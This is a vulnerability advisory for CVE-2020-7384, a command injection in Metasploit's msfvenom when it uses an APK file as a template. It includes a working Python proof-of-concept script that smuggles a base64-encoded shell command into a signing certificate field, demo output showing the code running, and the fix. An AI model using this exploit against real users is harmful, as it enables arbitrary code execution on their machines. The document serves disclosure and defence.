# Metasploit Framework - `msfvenom` APK template command injection

CVE-2020-7384

Versions affected:

* Metasploit Framework <= 6.0.11
* Metasploit Pro <= 4.18.0

Platforms affected: Linux and macOS

Windows systems do not seem to be affected because `msfvenom`'s support for APK
templates is broken when running on Windows.

A fix for this issue was submitted at
<https://github.com/rapid7/metasploit-framework/pull/14288>. Users should
update to Metasploit Framework 6.0.12 or newer, or Metasploit Pro 4.19.0 or
newer.

## Notice regarding "attackers" and "victims"

This advisory describes a vulnerability in Metasploit Framework, which is a
framework for developing and using exploits. We normally think of the user of
Metasploit Framework as the "attacker", and the target as being the "victim".
When there's a vulnerability in offensive software such as Metasploit, the
attacker becomes the victim.

To make matters more confusing, there is now a Metasploit module that exploits
this vulnerability. Thus there could be a scenario in which a user of
Metasploit uses it to attack another user using Metasploit.

## In Brief

There is a command injection vulnerability in `msfvenom` when using a crafted
APK file as an Android payload template.

Metasploit Framework provides the `msfvenom` tool for payload generation. For
many of the payload types provided by `msfvenom`, it allows the user to provide
a "template" using the `-x` option.

For example, the documentation at
<https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom#how-to-supply-a-custom-template>
explains that the following command can be used to generate a Windows
Meterpreter payload as a .exe file using the default template provided with
Metasploit.

```
./msfvenom -p windows/meterpreter/bind_tcp -f exe > new.exe 
```

The following command would produce the same Meterpreter payload, but instead
of being embedded in the default template, it would be embedded within the
given `calc.exe` Windows executable file:

```
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
```

When generating Android payloads in particular, `msfvenom` can use an APK file
of the user's choosing as a template. An APK file is an Android software
package. There is a command injection vulnerability in the way that `msfvenom`
handles these APK files when used as templates.

An attacker who could trick an `msfvenom` user into using a crafted APK file as
a template could execute arbitrary commands on the user's system.

For example, an attacker could prepare and publish a crafted APK file that they
believe is an enticing template. If a user of Metasploit Framework obtains that
APK file and attempts to use it as an `msfvenom` template, arbitrary commands
can be executed on that user's machine.

Note that using any file as a payload template *should* be a safe operation for
the attacker. During payload generation, the template is not executed on the
attacker's machine. The payload is simply the file within which the generated
payload will be embedded.

## The Vulnerability

Note that links in this section point to a copy of the code as of a vulnerable
commit.

The process used by `msfvenom` for using an APK file as a template is as
follows:

1. It executes `keytool` to extract the "Owner" field from the APK's signature, as well as the signature's timestamp (<https://github.com/rapid7/metasploit-framework/blob/64695f1/lib/msf/core/payload/apk.rb#L128>)
2. It executes `keytool` to generate a new signing key and self-signed certificate based on the details extracted from the APK file in step 1 (<https://github.com/rapid7/metasploit-framework/blob/64695f1/lib/msf/core/payload/apk.rb#L194-L197>)
3. It executes `apktool` to do various decompilation operations, uses an XML parser to parse the original APK's XML manifest file, injects the payload, rebuilds the injected APK, uses `jarsigner` to sign the APK with the keys generated in step 2 and uses `zipalign` to align the APK file (<https://github.com/rapid7/metasploit-framework/blob/64695f1/lib/msf/core/payload/apk.rb#L200-L298>)

The command vulnerability is in step 2 of this process. `keytool` is executed
using the following command line:

```
keytool -genkey -v -keystore #{keystore} \
    -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
    -keysize 2048 -startdate '#{orig_cert_startdate}' \
    -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'
```

In particular, the value for `orig_cert_dname` is obtained from step 1 of the
process, where the original APK was parsed and the "Owner" field was extracted
from the APK's signature.

This command string is passed to `Open3.popen3()`. When this function receives
a single string parameter (as opposed to multiple parameters) it effectively
acts as a `system()` function.

This gives rise to a command injection vulnerability. If a crafted APK file has
a signature with an "Owner" field containing:

* A single quote (to escape the single-quoted string)
* Followed by shell metacharacters

When that APK file is used as an `msfvenom` template, arbitrary commands can be
executed on the `msfvenom` user's system.

## POC

The following Python script will produce a crafted APK file that executes a
given command-line payload when used as a template.

```python
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'echo "Code execution as $(id)" > /tmp/win'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```

## Demo

Use the above POC to generate a malicious APK file:

```
% ./msfvenom_apk_template_poc.py
[+] Manufacturing evil apkfile
Payload: echo "Code execution as $(id)" > /tmp/win
-dname: CN='|echo ZWNobyAiQ29kZSBleGVjdXRpb24gYXMgJChpZCkiID4gL3RtcC93aW4= | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning:
The signer's certificate is self-signed.

[+] Done! apkfile is at /tmp/tmpbldx9xpk/evil.apk
Do: msfvenom -x /tmp/tmpbldx9xpk/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

Note that `/tmp/win` does not exist on the local machine:

```
% cat /tmp/win
cat: /tmp/win: No such file or directory
```

Use `msfvenom` and provide the malicious APK file as a template:

```
% msfvenom -x /tmp/tmpbldx9xpk/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
Using APK template: /tmp/tmpbldx9xpk/evil.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
[*] Creating signing key and keystore..
[*] Decompiling original APK..
[*] Decompiling payload APK..
Error: No such file or directory @ rb_sysopen - /tmp/d20201017-8966-1kwjoza/original/AndroidManifest.xml
```

Note that `/tmp/win` was created, proving arbitrary command execution:

```
% cat /tmp/win
Code execution as uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo)
```

## Fix

A fix for the issue was submitted at
<https://github.com/rapid7/metasploit-framework/pull/14288>. The fix was to
parameterise the arguments to `popen3()`, making it an `exec()`-style process
execution function which does not honour shell metacharacters.

The fix is included in Metasploit Framework 6.0.12 and Metasploit Pro 4.19.0

## Metasploit Module

A module targeting this vulnerability has been submitted for inclusion in
Metasploit Framework. See <https://github.com/rapid7/metasploit-framework/pull/14331>
